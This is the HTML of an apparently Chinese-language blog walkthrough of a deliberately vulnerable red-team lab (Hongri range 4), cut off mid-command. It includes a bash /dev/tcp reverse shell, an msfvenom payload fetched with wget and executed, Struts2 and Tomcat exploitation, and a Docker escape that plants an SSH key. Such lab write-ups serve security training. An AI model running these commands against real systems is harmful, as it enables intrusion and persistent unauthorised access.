@@ -1,0 +1,516 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场四 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="ATT&amp;CK红队评估四环境搭建首先添加两张网卡，VMnet0: 192.168.157.0      VMnet1: 192.168.183.0           web两张网卡VMnet0 VMnet1   1用户名密码：ubuntu:ubuntu  需手动开启ubuntu的docker环境，对应的端口服务如下 123456cd /home/ubuntu/Desktop/vulhub/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场四">
+<meta property="og:url" content="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="ATT&amp;CK红队评估四环境搭建首先添加两张网卡，VMnet0: 192.168.157.0      VMnet1: 192.168.183.0           web两张网卡VMnet0 VMnet1   1用户名密码：ubuntu:ubuntu  需手动开启ubuntu的docker环境，对应的端口服务如下 123456cd /home/ubuntu/Desktop/vulhub/">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.bimg.cc/random">
+<meta property="article:published_time" content="2024-01-23T09:25:42.516Z">
+<meta property="article:modified_time" content="2024-01-23T09:27:26.388Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场四',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-23 17:27:26'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场四</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-23T09:27:26.388Z" title="更新于 2024-01-23 17:27:26">2024-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%89%93%E9%9D%B6/">渗透打靶</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场四"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h2 id="ATT-CK红队评估四"><a href="#ATT-CK红队评估四" class="headerlink" title="ATT&amp;CK红队评估四"></a>ATT&amp;CK红队评估四</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先添加两张网卡，<code>VMnet0: 192.168.157.0 </code>    <code> VMnet1: 192.168.183.0</code>      </p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910114834980.png" alt="image-20230910114834980" style="zoom:67%;">
+
+
+
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>两张网卡<strong>VMnet0</strong> <strong>VMnet1</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910115939949.png" alt="image-20230910115939949">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：ubuntu:ubuntu</span><br></pre></td></tr></tbody></table></figure>
+
+<p>需手动开启ubuntu的docker环境，对应的端口服务如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><p>一张网卡<strong>VMnet1</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910120116886.png" class="" title="image-20230910120116886">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：administrator:Test2008</span><br><span class="line">修改后：administrator:Test2023</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>一张网卡<strong>VMnet1</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230910120238373.png" class="" title="image-20230910120238373">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名密码：douser:Dotest123</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left">主机</th>
+<th>外网IP</th>
+<th>内网IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">kali</td>
+<td>192.168.111.128</td>
+<td>无</td>
+</tr>
+<tr>
+<td align="left">web</td>
+<td>192.168.111.129</td>
+<td>192.168.183.129</td>
+</tr>
+<tr>
+<td align="left">DC</td>
+<td>无</td>
+<td>192.168.183.130</td>
+</tr>
+<tr>
+<td align="left">win7</td>
+<td>无</td>
+<td>192.168.183.134</td>
+</tr>
+</tbody></table>
+<h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="探测目标IP"><a href="#探测目标IP" class="headerlink" title="探测目标IP"></a>探测目标IP</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911161840445.png" alt="image-20230911161840445" style="zoom:67%;">
+
+<p>发现<strong>192.168.111.129</strong></p>
+<h4 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 192.168.111.129</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911163144925.png" alt="image-20230911163144925" style="zoom:67%;">
+
+<h4 id="web端信息搜集"><a href="#web端信息搜集" class="headerlink" title="web端信息搜集"></a>web端信息搜集</h4><h5 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h5><p>访问<strong>192.168.111.129:2001</strong></p>
+<p>是一个<strong>java</strong>编写的<strong>Struts2</strong>的页面</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911164028487.png" alt="image-20230911164028487" style="zoom:80%;">
+
+<p>直接用工具扫描 <a target="_blank" rel="noopener" href="https://www.cnsrc.org.cn/threatassessment/1694.html#J_DLIPPCont">Struts2全版本漏洞检测工具</a></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911170245253.png" alt="image-20230911170245253" style="zoom: 60%;">
+
+<p>扫描发现存在漏洞</p>
+<p>可以执行命令，发现有docker</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911170745496.png" alt="image-20230911170745496" style="zoom:60%;">
+
+<p>可以写入反弹shell的命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/192.168.111.128/8888 &lt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911171537568.png" alt="image-20230911171537568" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911171634868.png" alt="image-20230911171634868" style="zoom:67%;">
+
+<p>进行查看时也能查看是否存在 dockerrnv 文件。此时确定是在docker中，因此需要进行docker逃逸</p>
+<p>不会<strong>docker</strong>逃逸，网上很多wp都说不能逃逸成功，就没有再尝试</p>
+<h5 id="Tomcat-任意文件上传"><a href="#Tomcat-任意文件上传" class="headerlink" title="Tomcat 任意文件上传"></a>Tomcat 任意文件上传</h5><p><strong>2002</strong>端口是一个<strong>apache tomcat 8.5.19</strong></p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911173236564.png" alt="image-20230911173236564" style="zoom:80%;">
+
+<p>搜索一下版本漏洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911193641927.png" alt="image-20230911193641927" style="zoom:67%;">
+
+
+
+<p>发现该版本存在<strong>CVE-2017-12617</strong>漏洞，这个漏洞<strong>CVE- 2017-12615</strong>是<strong>Tomcat</strong>远程代码执行漏洞(PUT请求)，可以使用<strong>PUT</strong>方法上传任意文件</p>
+<p>将<strong>poc</strong>复制出来</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911194801242.png" alt="image-20230911194801242" style="zoom:67%;">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.111.129:2002/</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911195255492.png" alt="image-20230911195255492" style="zoom:67%;">
+
+<p>漏洞存在，可以打一个shell回来</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201107302.png" alt="image-20230911201107302" style="zoom:67%;">
+
+<p>因为是linux，所以需要生成linux的木马，在kali本地起一个http服务方便靶机下载</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201504742.png" alt="image-20230911201504742" style="zoom:67%;">
+
+<p>在桌面开启<strong>http</strong>服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911201627183.png" alt="image-20230911201627183" style="zoom:67%;">
+
+<p>下载shell.elf并赋权执行</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.111.128:8888/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911202852055.png" alt="image-20230911202852055" style="zoom:67%;">
+
+<p><strong>msf</strong>上线</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911203025950.png" alt="image-20230911203025950" style="zoom:67%;">
+
+<p>上线成功</p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到有eth0、eth1分别处于1.0/24和183.0/24两个网段，初步判断是有域环境的。</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911203338849.png" alt="image-20230911203338849" style="zoom:67%;">
+
+<p>继续往下看，还有几个<strong>ip</strong>，但是不是eth，而且这里有三个<strong>ip</strong>，根据上面有三个不同的环境，那么可以判断应该是用的<strong>docker</strong>。那么我们无论使用3个环境的哪个环境拿shell都只是一个<strong>docker</strong>容器里面的<strong>shell</strong>，并不是真正<strong>ubuntu</strong>的shell，所以这里我们还需要进行<strong>docker逃逸</strong>到<strong>ubuntu</strong></p>
+<h4 id="privileged特权模式逃逸"><a href="#privileged特权模式逃逸" class="headerlink" title="privileged特权模式逃逸"></a>privileged特权模式逃逸</h4><p>docker中提供了一个<code>--privileged</code>参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力<br><a target="_blank" rel="noopener" href="https://www.docker.com/blog/docker-can-now-run-within-docker/">https://www.docker.com/blog/docker-can-now-run-within-docker/</a></p>
+<p>docker文档中对这个参数的解释如下<br><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></p>
+<blockquote>
+<p>当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在<code>AppArmor</code>或<code>SELinux</code>中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</p>
+</blockquote>
+<p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入<strong>ssh</strong>私钥，使用<strong>ssh</strong>免密登录</p>
+<p>这里首先新建一个<strong>tmptest</strong>文件夹，用来存放挂载后的<strong>docker</strong></p>
+<p>查看一下<strong>dev文</strong>件夹里面的设备文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmptest</span><br><span class="line">ls /dev</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230911205654903.png" alt="image-20230911205654903" style="zoom:67%;">
+
+<p>可以看到有四个sda设备文件，我这里选择sda1进行挂载，使用mount命令将sda1挂载到tmptest文件夹里并用ls指令进行查看</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /tmptest</span><br><span class="line">ls /tmptest</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161003889.png" alt="image-20230912161003889" style="zoom:67%;">
+
+<p>然后使用ssh生成一个名叫tmp的私钥，然后用chmod命令赋予权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f tmp</span><br><span class="line">chmod 600 tmp</span><br><span class="line">cat tmp.pub</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161458737.png" alt="image-20230912161458737" style="zoom:67%;">
+
+<p>因为我们之前已经把sda1挂载成功了，那么我们如果要访问ubuntu的/home目录，我们直接访问挂载到的tmptest文件夹的/home文件夹即可，即/tmptest/home路径</p>
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161607236.png" alt="image-20230912161607236" style="zoom:67%;">
+
+<p>使用<code>ls -alh</code>查看当前目录下包括隐藏文件在内的所有文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /tmptest/home/ubuntu</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/image-20230912161713782.png" alt="image-20230912161713782" style="zoom:67%;">
+
+<p>这里我们看到了一个<code>.ssh</code>文件，我们要将<strong>ssh</strong>私钥写入到<code>.ssh</code>目录里面并将文件命名为<code>authorized_keys</code>（目标机<code>.ssh</code>目录权限必须为<strong>700</strong>）</p>
+<p>使用如下命令写入ssh私钥</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /tmptest/home/ubuntu/.ssh/id_rsa.pub /tmptest/home/ubuntu/.ssh/authorized_keys </span><br><span class="line"></span><br><span class="line">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCd5VN+GxFBMKzMzvTAmb0lrVgJ8I5WPuyz7mhAgjNK0j/WrvfAPn/rTKhJZFguxBV+8azP9T/r/grA0upCalbF8hF3NONCYtjSWyPqmgXaqwauK3NIHGdiUtIq7vMZ2j16aMh13WesrJhPku/tCuaqysksEWSm4OYJgOEnfas+jtlLVC33fBiDs294Uea3M5Gpr1qsw2wNer3PVe2ZeNvdEdGnBb2P/GX+ur2Lsjal6QMlbLQLMtgzWkZQID07asPpE30dR5q9Cat58KUMsj9C9jjKWVdNaOM0Zs4TlVVSIH6qj/taVcaJ5xVXzWqdF67sBl0hZSYD2SyHRe7n+gXYZhf53Wll3U/TmedaRD7svvXHmx+VdxU/tGPK2hReUMKWxg+qnH8K4JLe8WgbpU9tnYaHrtxEttwGZrYzGd0hEdl0U2cLIoo2mKy01BQynHuLmOZc1TzA/VMfs/OwIhva0KrBdvkQTc609Fzzq71o1fP5GjrOp56n5fssoerGABE= root@kali</span><br><span class="line">' &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">echo 'ssh-rsa 